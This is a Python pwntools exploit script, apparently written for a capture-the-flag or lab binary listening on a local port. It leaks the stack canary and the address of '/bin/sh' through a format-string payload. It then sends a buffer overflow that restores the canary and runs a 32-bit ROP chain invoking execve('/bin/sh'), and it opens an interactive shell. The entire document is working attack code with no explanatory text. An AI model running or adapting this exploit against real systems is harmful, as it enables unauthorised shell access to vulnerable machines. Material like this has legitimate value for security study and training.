from pwn import *

global_addr_check_padding = "A" * 16
global_addr_padding = 'A' * 4
ret_padding = 'A' * 4

FOUR_BYTES_IN_STR_SIZE = 8
binsh = '/bin/sh'

def main():
    p = remote('127.0.0.1', 8841)
    p.recv()
    p.sendline('%p' + '%x' * 129 + binsh)
    leak = p.recv()
    full_hex_leak = leak.split('\n')[0]
    binsh_leak = int(full_hex_leak[2:2 + FOUR_BYTES_IN_STR_SIZE], base=16) + 260
    stack_cookie_leak = int(full_hex_leak[-8 - len(binsh):-len(binsh)], base=16)
    
    print("Found stack canary: {}".format(hex(stack_cookie_leak)))
    print("Found binsh address: {}".format(hex(binsh_leak)))

    p.sendline("A")
    p.clean()
    
    execve_rop = [
        p32(0x80e4809),     # pop eax ; ret
        p32(0xb),           # 0xb syscall num (execve)
        p32(0x80bcc84),     # pop ebx ; ret
        p32(binsh_leak),    # addr to "/bin/sh" on buf_secure
        p32(0x080e71c5),    # pop ecx ; ret
        p32(0x0),           # ecx will be 0
        p32(0x0806f22a),    # pop edx ; ret
        p32(0x0),           # edx will be 0
        p32(0x08048ef6),    # int 0x80
    ]
    
    p.send(global_addr_check_padding + p32(0xdeadbeef) + global_addr_padding + p32(stack_cookie_leak) + ret_padding + ''.join(execve_rop))
    p.interactive()
    
    
if __name__ == "__main__":
    main()